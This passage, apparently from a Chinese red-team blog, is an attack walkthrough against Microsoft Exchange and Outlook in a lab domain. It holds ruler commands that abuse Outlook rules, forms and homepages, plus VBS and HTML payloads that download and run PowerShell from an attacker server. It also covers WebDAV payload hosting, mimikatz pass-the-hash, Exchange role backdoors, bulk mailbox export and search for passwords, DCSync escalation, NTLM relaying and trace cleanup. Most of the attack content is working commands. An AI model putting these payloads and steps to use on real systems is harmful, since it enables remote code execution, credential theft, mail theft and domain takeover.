<h2 id="4-滥用outlook功能攻击PC"><a href="#4-滥用outlook功能攻击PC" class="headerlink" title="4. 滥用outlook功能攻击PC"></a>4. 滥用outlook功能攻击PC</h2><p>微软在 2017 年陆续修复了这些攻击面：默认禁止规则启动应用程序和运行脚本；默认禁止自定义表单执行脚本且需要将每一个自定义表单消息类注册为受信任的表单消息类；默认关闭主页功能。</p>
<h3 id="（1）Rules"><a href="#（1）Rules" class="headerlink" title="（1）Rules"></a>（1）Rules</h3><p>说简单点，outlook有规则功能，设置自定义之后比如给张三发邮件，触发规则会自动从远程下载并执行远控木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">不同的 Outlook 客户端实例之间会自动从 Exchange 服务端同步配置，攻击者在本地给目标账户配置的规则会在目标通过 Outlook 登录该账户时自动同步过去，然后自动触发规则，执行恶意程序。</span><br><span class="line"></span><br><span class="line">据此，ruler 通过 /mapi 接口模拟实现了 Outlook 功能，将上述过程武器化：</span><br><span class="line"># 增加规则</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose add --name &quot;Add Spam&quot; --trigger &quot;Jack&quot; --location \\\\ip\\webdav\\psh.exe --send</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose add --name &quot;Remove Spam&quot; --trigger &quot;Tom&quot; --location \\\\ip\\webdav\\calc.vbs --send</span><br><span class="line"></span><br><span class="line"># 发送邮件触发规则</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose send --subject &quot;Jack&quot;</span><br><span class="line"></span><br><span class="line"># 列出规则</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose display</span><br><span class="line"></span><br><span class="line"># 删除规则</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose delete --id 0100000000000583</span><br></pre></td></tr></table></figure>

<p>上述过程中，攻击者需要将恶意程序放置在目标能够访问到的位置，所以需要在 vps 上配置 webdav 或 smb。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># VPS 上 Apache 开启 WebDAV</span><br><span class="line">sudo a2enmod dav</span><br><span class="line">sudo a2enmod dav_fs</span><br><span class="line">sudo service apache2 restart</span><br><span class="line">sudo mkdir /var/www/webdav</span><br><span class="line"></span><br><span class="line"># 修改 Apache 配置文件</span><br><span class="line">vi /etc/apache2/sites-enabled/000-default.conf</span><br><span class="line"></span><br><span class="line"># 在文件中添加以下内容：</span><br><span class="line">Alias /webdav /var/www/webdav</span><br><span class="line">&lt;Location /webdav&gt;</span><br><span class="line">    Options Indexes</span><br><span class="line">    DAV On</span><br><span class="line">    Allow from all</span><br><span class="line">    # AuthType Basic</span><br><span class="line">    # AuthName &quot;webdav&quot;</span><br><span class="line">    # AuthUserFile /etc/apache2/webdav.password</span><br><span class="line">    # Require valid-user</span><br><span class="line">&lt;/Location&gt;</span><br></pre></td></tr></table></figure>

<p>在执行恶意程序时，如果直接放 exe 可执行程序，可能是 webdav 的问题，上线一直失败，改成 vbs 加载一句话可以成功上线。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># calc.vbs</span><br><span class="line">CreateObject(&quot;WScript.Shell&quot;).Run &quot;powershell.exe -nop -w hidden -c &quot;&quot;IEX ((new-object net.webclient).downloadstring(&#x27;&lt;http://ip:8080/a&gt;&#x27;))&quot;&quot;&quot;,0</span><br></pre></td></tr></table></figure>

<h3 id="（2）Forms"><a href="#（2）Forms" class="headerlink" title="（2）Forms"></a>（2）Forms</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用户可以自定义表单，开发工具 -&gt; 设计窗体 -&gt; 标准窗体库 -&gt; 邮件 -&gt; 打开，在其中可以改变表单样式。甚至可以更进一步，在 窗体 -&gt; 查看代码 处为&quot;打开、转发、删除&quot;等事件添加 VB 代码，攻击者可以借此来攻击 Outlook 客户端。</span><br><span class="line"></span><br><span class="line"># 增加表单</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose form add --suffix zs --input ps2cs.vbs</span><br><span class="line"></span><br><span class="line"># 发送表单，用户点击时触发代码执行</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose form send --suffix zs</span><br><span class="line"></span><br><span class="line"># 列出表单</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose form display</span><br><span class="line"></span><br><span class="line"># 删除表单</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose form delete --suffix zs</span><br></pre></td></tr></table></figure>

<h3 id="（3）-Homepage"><a href="#（3）-Homepage" class="headerlink" title="（3） Homepage"></a>（3） Homepage</h3><p>Outlook 可以为每个文件夹设置主页，主页可以是内&#x2F;外部的 http&#x2F;https url，目的是让用户自由渲染文件夹样式。</p>
<p>攻击者可以设置恶意主页，在 javascript 脚本中加载 <code>ViewCtl1.OutlookApplication</code> 逃离沙盒，进而调用 <code>Wscript.Shell</code> 创建命令执行。在受害者通过 Outlook 打开”收件箱”文件夹时会自动触发。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 设置主页</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose homepage add --url &lt;http://ip/home.html&gt;</span><br><span class="line"></span><br><span class="line"># 展示当前主页</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose homepage display</span><br><span class="line"></span><br><span class="line"># 删除当前主页</span><br><span class="line">ruler-win64.exe -insecure --url &lt;https://win2012-ex2016.island.com/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com --username zhangsan --password ZS@123qwe --debug --verbose homepage delete</span><br><span class="line"></span><br><span class="line"># home.html（包含嵌入的 VBScript，用户打开 Outlook 时触发）</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script id=clientEventHandlersVBS language=vbscript&gt;</span><br><span class="line">    Sub window_onload()</span><br><span class="line">        Set Application = ViewCtl1.OutlookApplication</span><br><span class="line">        Set cmd = Application.CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">        cmd.Run &quot;powershell.exe -nop -w hidden -c &quot;&quot;IEX ((new-object net.webclient).downloadstring(&#x27;&lt;http://ip:8080/a&gt;&#x27;))&quot;&quot;&quot;,0</span><br><span class="line">    End Sub</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;object classid=&quot;clsid:0006F063-0000-0000-C000-000000000046&quot; id=&quot;ViewCtl1&quot; data=&quot;&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h1 id="三、拥有高权限账户"><a href="#三、拥有高权限账户" class="headerlink" title="三、拥有高权限账户"></a>三、拥有高权限账户</h1><p>无论是获取了高权限的域账号，还是获取了 Exchange 服务器权限，都可以对 Exchange 进行管理，Exchange 支持多种方式进行本地、远程管理。</p>
<h2 id="1-管理Exchange"><a href="#1-管理Exchange" class="headerlink" title="1. 管理Exchange"></a>1. 管理Exchange</h2><h3 id="1-如果已有高权限域账号"><a href="#1-如果已有高权限域账号" class="headerlink" title="(1)如果已有高权限域账号"></a>(1)如果已有高权限域账号</h3><p>通常创建 Exchange 的那个域账号会被加入 <code>Exchange Organization Administrators</code> 或 <code>Organization Management</code> 组（不同版本组名不同），如果拿到该组成员的凭证，可以使用 <code>/PowerShell</code> 接口对 Exchange 进行远程管理。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 设置明文凭证并连接</span><br><span class="line">$User = &quot;island.com\\enterprise_admin&quot;</span><br><span class="line">$Pass = ConvertTo-SecureString -AsPlainText EA@123qwe -Force</span><br><span class="line">$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass</span><br><span class="line">$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri &lt;https://win2012-ex2016.island.com/PowerShell&gt; -Authentication Kerberos -Credential $Credential</span><br><span class="line">Import-PSSession $Session -AllowClobber</span><br><span class="line"></span><br><span class="line"># 测试是否成功</span><br><span class="line">Get-Mailbox</span><br><span class="line"></span><br><span class="line"># 删除连接</span><br><span class="line">Remove-PSSession $Session</span><br></pre></td></tr></table></figure>

<p>如果没有明文密码，只有 Hash，可以用 mimikatz pth</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 使用 mimikatz 执行 PTH（Pass-the-Hash）攻击并启动 PowerShell 会话</span><br><span class="line">mimikatz.exe privilege::debug &quot;sekurlsa::pth /user:enterprise_admin /domain:island.com /ntlm:d81a42dfacbaf5e346eb9a072773309d /run:powershell&quot; exit</span><br><span class="line"></span><br><span class="line"># 在 mimikatz 启动的 PowerShell 会话中连接 Exchange 管理接口</span><br><span class="line">$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri &lt;https://win2012-ex2016.island.com/PowerShell&gt;</span><br><span class="line">Import-PSSession $Session -AllowClobber</span><br></pre></td></tr></table></figure>

<h3 id="2-如果已有Exchange服务器权限"><a href="#2-如果已有Exchange服务器权限" class="headerlink" title="(2)如果已有Exchange服务器权限"></a>(2)如果已有Exchange服务器权限</h3><p>有两种方式：</p>
<p>一是通过 <code>Exchange Management Shell</code> 进行管理</p>
<p>这是一个封装好的 .ps 脚本，其原理也是使用 <code>/PowerShell</code> 接口对 Exchange 进行远程管理，默认使用当前凭证创建 PSSession（当然也可以pth其他的hash凭证管理）</p>
<p>二是打开 Powershell 加载网络管理单元，不同版本 Exchange 加载语句不同：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Exchange 2007</span><br><span class="line">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;</span><br><span class="line"></span><br><span class="line"># Exchange 2010</span><br><span class="line">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;</span><br><span class="line"></span><br><span class="line"># Exchange 2013 &amp; 2016</span><br><span class="line">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;</span><br></pre></td></tr></table></figure>

<h3 id="3-语法所需权限"><a href="#3-语法所需权限" class="headerlink" title="(3)语法所需权限"></a>(3)语法所需权限</h3><p>通过各种方式连接上 Exchange 管理端后，会自动加载大量的 <code>Exchange Cmdlet</code></p>
<p>Exchange 通过基于角色的访问控制（RBAC）进行权限管理，用户拥有相应的角色才可以使用对应的 <code>Exchange Cmdlet</code></p>
<p>否则在连接阶段就不会获取没有权限的 <code>Exchange Cmdlet</code>。</p>
<p>下面语句描述如何查看某个 Cmdlet 所需角色，并为用户赋予该角色，让其可以执行该 Cmdlet：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有 Exchange Cmdlet</span><br><span class="line">Get-ExCommand</span><br><span class="line"></span><br><span class="line"># 查看执行某个 Cmdlet 所需的角色</span><br><span class="line">Get-ManagementRole -Cmdlet New-ManagementRoleAssignment</span><br><span class="line"></span><br><span class="line"># 给某个用户赋予所需角色，让其可以执行某个 Cmdlet</span><br><span class="line">New-ManagementRoleAssignment -Role &quot;Role Management&quot; -User zhangsan -Name &quot;Role Management Back&quot;</span><br><span class="line"></span><br><span class="line"># 查看角色授权是否成功</span><br><span class="line">Get-ManagementRoleAssignment –Role &quot;Role Management&quot; | Format-List</span><br><span class="line"></span><br><span class="line"># 删除某个角色授权</span><br><span class="line">Remove-ManagementRoleAssignment -Identity &quot;Role Management Back&quot; -Confirm:$false</span><br></pre></td></tr></table></figure>

<p>需要注意的是，<code>Get-ManagementRole</code> 和 <code>Get-ManagementRoleAssignment</code> 需要 <code>Role Management</code> 角色</p>
<p>而该角色一般被分配给 <code>Organization Management</code> 角色组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Exchange 管理端添加 Exchange 管理员</span><br><span class="line">Add-RoleGroupMember &quot;Organization Management&quot; -Member zhangsan -BypassSecurityGroupManagerCheck</span><br><span class="line">Add-RoleGroupMember &quot;Exchange Organization Administrators&quot; -Member zhangsan -BypassSecurityGroupManagerCheck</span><br><span class="line"></span><br><span class="line"># 域管添加 Exchange 管理员</span><br><span class="line">net groups &quot;Organization Management&quot; zhangsan /DOMAIN /ADD</span><br><span class="line">net groups &quot;Exchange Organization Administrators&quot; zhangsan /DOMAIN /ADD</span><br><span class="line"></span><br><span class="line"># 将用户加入 Role Management 组，可以任意添加角色，相当于后门</span><br><span class="line">New-ManagementRoleAssignment -Role &quot;Role Management&quot; -User zhangsan -Name &quot;Role Management Back&quot;</span><br></pre></td></tr></table></figure>

<p>添加特定的角色后，攻击者就可以进行管理员级别的信息收集。</p>
<h3 id="4-统计信息"><a href="#4-统计信息" class="headerlink" title="(4)统计信息"></a>(4)统计信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有邮箱信息，默认显示邮件数量、最后登录时间</span><br><span class="line">Get-Mailbox -ResultSize unlimited | Get-MailboxStatistics</span><br><span class="line"></span><br><span class="line"># 查看 zhangsan 的发件箱详情</span><br><span class="line">Get-MessageTrackingLog -Start &quot;01/11/2019 09:00:00&quot; -Sender &quot;zhangsan@island.com&quot; -EventID SEND | Format-Table Timestamp,ClientIp,ClientHostname,EventId,Sender,Recipients,MessageSubject</span><br></pre></td></tr></table></figure>

<h3 id="5-全局搜索"><a href="#5-全局搜索" class="headerlink" title="(5)全局搜索"></a>(5)全局搜索</h3><p>两种方式搜索全局邮件，<code>/PowerShell</code> 或 <code>/EWS</code> 这俩接口</p>
<ul>
<li>&#x2F;Powershell接口</li>
</ul>
<p>如果用户拥有 <strong>Mailbox Import Export</strong> 和 <strong>Mailbox Search</strong> 角色，则可以使用搜索和导出相关的 Cmdlet。</p>
<p>老版本 Exchange 中这两个角色默认没有分配给任何用户或角色组，包括 Organization Management 组。</p>
<p>在实战中，通常先用 Organization Management 组用户登录管理接口，给自己赋予这两个角色，</p>
<p>再重新连接远程会话自动加载相应 Cmdlet。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 赋予角色，需要重新连接才能加载相应 Cmdlet</span></span><br><span class="line"><span class="built_in">New-ManagementRoleAssignment</span> <span class="literal">-Role</span> <span class="string">&quot;Mailbox Search&quot;</span> <span class="literal">-User</span> enterprise_admin</span><br><span class="line"><span class="built_in">New-ManagementRoleAssignment</span> <span class="literal">-Role</span> <span class="string">&quot;Mailbox Import Export&quot;</span> <span class="literal">-User</span> enterprise_admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除角色</span></span><br><span class="line"><span class="built_in">Remove-ManagementRoleAssignment</span> <span class="literal">-Identity</span> <span class="string">&quot;Mailbox Search-enterprise_admin&quot;</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line"><span class="built_in">Remove-ManagementRoleAssignment</span> <span class="literal">-Identity</span> <span class="string">&quot;Mailbox Import Export-enterprise_admin&quot;</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出所有邮箱正文中带 pass 的邮件，localhost 为 Exchange 服务器</span></span><br><span class="line"><span class="built_in">Get-Mailbox</span> <span class="literal">-OrganizationalUnit</span> Users <span class="literal">-ResultSize</span> unlimited | %&#123;</span><br><span class="line">    <span class="built_in">New-MailboxExportRequest</span> <span class="literal">-Mailbox</span> <span class="variable">$_</span>.name <span class="literal">-CompletedRequestAgeLimit</span> <span class="number">0</span> <span class="literal">-ContentFilter</span> &#123;(body <span class="operator">-like</span> <span class="string">&quot;*pass*&quot;</span>)&#125; <span class="literal">-FilePath</span> (<span class="string">&quot;\\\\localhost\\c<span class="variable">$</span>\\test\\&quot;</span> + <span class="variable">$_</span>.name + <span class="string">&quot;.pst&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除导出记录，导出时不加 CompletedRequestAgeLimit 参数会留下导出记录</span></span><br><span class="line"><span class="built_in">Get-MailboxExportRequest</span> | <span class="built_in">Remove-MailboxExportRequest</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索所有邮件，SearchQuery 只支持向后匹配，也可以匹配邮件其他位置（如收件人、发件人、CC 等）</span></span><br><span class="line"><span class="built_in">Get-Mailbox</span> <span class="literal">-OrganizationalUnit</span> Users <span class="literal">-ResultSize</span> unlimited | %&#123;</span><br><span class="line">    <span class="built_in">Search-Mailbox</span> <span class="literal">-Identity</span> <span class="variable">$_</span>.name <span class="literal">-SearchQuery</span> <span class="string">&quot;pass*&quot;</span> <span class="literal">-TargetMailbox</span> <span class="string">&quot;zhangsan&quot;</span> <span class="literal">-TargetFolder</span> <span class="string">&quot;outAll&quot;</span> <span class="literal">-LogLevel</span> Suppress</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li>通过 &#x2F;EWS 查询</li>
</ul>
<p>如果用户拥有 <strong>ApplicationImpersonation</strong> 角色，则可以模拟其他用户登录 &#x2F;EWS，</p>
<p>进而通过 &#x2F;EWS 编程实现搜索所有邮件功能。</p>
<p>在实战中，通常先用 Organization Management 组用户登录管理接口，</p>
<p>给自己赋予这个角色，再通过 &#x2F;EWS 搜索邮件。</p>
<p>此处基于 MailSniper 脚本，做了优化，包括授权生效时间、匹配附件名、输出内容以及指定账密。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MailSniper.ps1</span></span><br><span class="line"><span class="comment"># 搜索所有邮件，需要提供管理员账号给用户授予 ApplicationImpersonation 权限</span></span><br><span class="line"><span class="built_in">Invoke-GlobalMailSearch</span> <span class="literal">-Folder</span> all <span class="literal">-ImpersonationAccount</span> enterprise_admin <span class="literal">-ExchHostname</span> win2012<span class="literal">-ex2016</span>.island.com <span class="literal">-AdminUserName</span> enterprise_admin <span class="literal">-AdminPassword</span> EA@<span class="number">123</span>qwe <span class="literal">-MailsPerUser</span> <span class="number">500</span> <span class="literal">-Terms</span> <span class="string">&quot;*password*&quot;</span>,<span class="string">&quot;*creds*&quot;</span>,<span class="string">&quot;*credentials*&quot;</span>,<span class="string">&quot;*测试*&quot;</span>,<span class="string">&quot;*密码*&quot;</span>,<span class="string">&quot;*拓扑*&quot;</span>,<span class="string">&quot;*运维*&quot;</span>,<span class="string">&quot;*VPN*&quot;</span>,<span class="string">&quot;*账号*&quot;</span> <span class="literal">-OutputCsv</span> global<span class="literal">-email-search</span>.csv</span><br></pre></td></tr></table></figure>

<h2 id="2-攻击域管"><a href="#2-攻击域管" class="headerlink" title="2. 攻击域管"></a>2. 攻击域管</h2><p>拿到高权限的域账号或 Exchange 服务器权限后，除了可以管理 Exchange 进行邮件搜索外，还可以向域管发起攻击。</p>
<h3 id="（1）-已有Exchange服务器权限"><a href="#（1）-已有Exchange服务器权限" class="headerlink" title="（1） 已有Exchange服务器权限"></a>（1） 已有Exchange服务器权限</h3><p>在 Exchange 安装完后，域内会添加一个名为 <code>Microsoft Exchange Security Groups</code> 的 OU</p>
<p>其包括两个特殊的组：<code>Exchange Windows Permissions</code> 和 <code>Exchange Trusted Subsystem</code>，后者隶属于前者</p>
<p>所有的 Exchange 服务器都会加入 <code>Exchange Trusted Subsystem</code> 组</p>
<p>也就是 Exchange 服务器都继承了 <code>Exchange Windows Permissions</code> 组的权限，而该组拥有对域分区的 <code>WriteDacl</code> 权限且可以集成</p>
<p>因此，在拿下 Exchange 服务器后，可以利用 Exchange 机器账户对域分区添加任意 ACL 进行提权，比如添加 <code>Dcsync</code> 权限导出域内所有 Hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">查看 Exchange Windows Permissions 对域 NC 是否有 WriteDacl 权限</span><br><span class="line">AdFind.exe -h 192.168.60.112 -s Base -b &quot;DC=island,DC=com&quot; nTSecurityDescriptor -nosacl -sddl+++ -sddlfilter A;;&quot;WRT PERMS&quot;;;;&quot;Exchange Windows Permissions&quot; -recmute</span><br><span class="line"></span><br><span class="line">拿下 Exchange 服务器权限后，获取机器账户 Hash 并使用 mimikatz PTH</span><br><span class="line">mimikatz &quot;log&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:WIN2012-EX2016$ /domain:island.com /ntlm:2d03b02750ee9a3bd9902a370cf67746 /run:cmd&quot; exit</span><br><span class="line"></span><br><span class="line">使用 PowerView.ps1 修改域分区 ACL，赋予 DCSync 权限</span><br><span class="line">Add-DomainObjectAcl -DomainController 192.168.60.112 -TargetDomain island.com -TargetIdentity &quot;DC=island,DC=com&quot; -PrincipalIdentity zhangsan -Rights DCSync -Verbose</span><br><span class="line"></span><br><span class="line">查看 zhangsan 是否拥有对应 SID 权限</span><br><span class="line">Get-DomainObjectAcl -DomainController 192.168.60.112 -Domain island.com -Identity island | ?&#123;$_.SecurityIdentifier -eq &quot;S-1-5-21-65208363-682840273-3768764330-sidofzhangsan&quot;&#125;</span><br><span class="line"></span><br><span class="line">删除赋予的 DCSync 权限（清理痕迹）</span><br><span class="line">Remove-DomainObjectAcl -DomainController 192.168.60.112 -TargetDomain island.com -TargetIdentity &quot;DC=island,DC=com&quot; -PrincipalIdentity zhangsan -Rights DCSync -Verbose</span><br><span class="line"></span><br><span class="line">检查 zhangsan 是否成功拥有以下权限：</span><br><span class="line">Replicating Directory Changes</span><br><span class="line">Replicating Directory Changes All</span><br><span class="line">AdFind.exe -h 192.168.60.112 -s Base -b &quot;DC=island,DC=com&quot; nTSecurityDescriptor -nosacl -sddl+++ -sddlfilter A;;;&quot;Replicating Directory Changes&quot;;;&quot;zhangsan&quot; -recmute</span><br><span class="line"></span><br><span class="line">使用 zhangsan 进行 PTH 并执行 DCSync</span><br><span class="line">mimikatz privilege::debug &quot;sekurlsa::pth /user:zhangsan /domain:island.com /ntlm:82b6413f42426e0b40e6d0674eb16299 /run:cmd&quot; exit</span><br><span class="line">mimikatz privilege::debug &quot;lsadump::dcsync /domain:island.com /all /csv /dc:WIN2012-DC1.island.com&quot; exit</span><br><span class="line"></span><br><span class="line">也可以使用 secretsdump 验证获取 NTLM</span><br><span class="line">python3 secretsdump.py island.com/zhangsan:ZS@123qwe@192.168.60.112 -dc-ip 192.168.60.112 -just-dc-ntlm</span><br></pre></td></tr></table></figure>

<p>与域控进行 LDAP 通信的时候有许多注意的地方，比如本地走代理，此时是在域外执行的，需要指定域控、域名等；比如普通域用户权限 AdFind 默认查询 ACL 会失败，因为没有权限查询 SACL 导致域控什么也不返回，需要添加 <code>-nosacl</code>，而 powerview 默认只查询 DACL 所以可以成功。</p>
<p>或者，也可以直接中继 Exchange，让 ntlmrelayx 自动完成提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Exchange System 权限执行</span><br><span class="line">powershell Invoke-WebRequest &lt;http://192.168.60.172&gt; -UseDefaultCredentials</span><br><span class="line"></span><br><span class="line"># 内网机器上做中继，自动通过 ACL 进行提权</span><br><span class="line">python3 ntlmrelayx.py -t ldap://192.168.60.112 -smb2support</span><br></pre></td></tr></table></figure>

<h3 id="（2）已有高权限域账号"><a href="#（2）已有高权限域账号" class="headerlink" title="（2）已有高权限域账号"></a>（2）已有高权限域账号</h3><p><code>Exchange Organization Administrators</code> 或 <code>Organization Management</code> 组</p>
<p>对 <code>Exchange Windows Permissions</code> 和 <code>Exchange Trusted Subsystem</code> 组拥有 <code>GenericAll</code> 权限</p>
<p>因此，如果获得了 <code>Organization Management</code> 组成员的权限，可以将任意账户添加至 <code>Exchange Windows Permissions</code> 或 <code>Exchange Trusted Subsystem</code> 组，进而继续通过上述方法提权打DCSync接管整个全域</p>
